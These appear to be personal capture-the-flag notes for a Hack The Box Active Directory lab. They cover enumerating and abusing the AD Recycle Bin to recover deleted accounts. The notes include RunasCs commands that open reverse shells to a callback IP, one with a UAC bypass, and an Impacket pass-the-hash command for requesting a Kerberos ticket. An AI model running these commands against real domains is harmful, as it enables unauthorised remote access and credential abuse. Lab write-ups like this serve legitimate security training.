# ad recycle bin

[https://cravaterouge.com/articles/ad-bin/](https://cravaterouge.com/articles/ad-bin/)


upload powerview:

`Get-ADOptionalFeature 'Recycle Bin Feature'`


```powershell
DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=voleur,DC=htb
EnabledScopes      : {CN=Partitions,CN=Configuration,DC=voleur,DC=htb, CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=voleur,DC=htb}
FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
FeatureScope       : {ForestOrConfigurationSet}
IsDisableable      : False
Name               : Recycle Bin Feature
ObjectClass        : msDS-OptionalFeature
ObjectGUID         : ba06e572-1681-46f7-84d2-e08b001f5c51
RequiredDomainMode :
RequiredForestMode : Windows2008R2Forest
```

OR you can use nxc too,
```bash
nxc nxc ldap 10.129.246.248 -u j.harris -p '<PASSWORD>' -M tombstone
```
To interact with the recyclebin, I’ll need to switch to svc_ldap. This user can’t WinRM, but I can use [RunasCs](https://github.com/antonioCoco/RunasCs):

`*Evil-WinRM* PS C:\programdata> .\RunasCs.exe svc_ldap <PASSWORD> powershell -r <CALLBACK_IP>:<PORT>`

`.\RunasCs.exe todd.wolfe <PASSWORD> powershell -r <CALLBACK_IP>:<PORT> --bypass-uac`

I’ll check for any deleted accounts in the recyclebin:

`PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent`

```jsx
##GET TICKET USING ONLY NTLM HASH USING GETTGT

getTGT.py VOLEUR.HTB/administrator -hashes :<NTLM_HASH>
```